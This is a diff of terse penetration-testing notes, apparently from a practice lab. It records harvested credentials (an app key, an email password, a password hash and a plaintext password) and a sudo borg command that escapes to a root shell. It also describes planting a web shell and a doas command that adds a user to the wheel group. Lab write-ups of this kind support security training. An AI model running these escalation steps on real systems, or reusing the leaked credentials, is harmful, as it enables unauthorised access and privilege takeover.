@@ -40,7 +40,7 @@ wit winpeas we can find the appkey `!8@aBRBYdb3!` that is mark password
 
 Download /staging/.git from .249 to analyze the commits
 
-maildmz@relia.com:DPuBT9tGCBrTbR
+maildmz@relia.com:ls -
 
 now use this attack [https://github.com/gustanini/WinLib\_Gen](https://github.com/gustanini/WinLib_Gen)
 
@@ -116,4 +116,28 @@ YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
 ### 16.x.19
 
 enter with sarah id\_rsa
+
+borg privesc&#x20;
+
+```
+sudo /usr/bin/borg extract @:/::: --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
+```
+
+loot:
+
+amy : 0814b6b7f0de51ecf54ca5b6e6e612bf
+
+andrew : Rb9kNokjDsjYyH
+
+### 16.x.20
+
+login as andrew.
+
+start apache with `doas service apache24 onestart`  and write a web shell in the apache folder.
+
+then use it to add andrew to the wheel group
+
+```
+/usr/local/bin/doas+pw+usermod+andrew+-G+wheel
+```
 
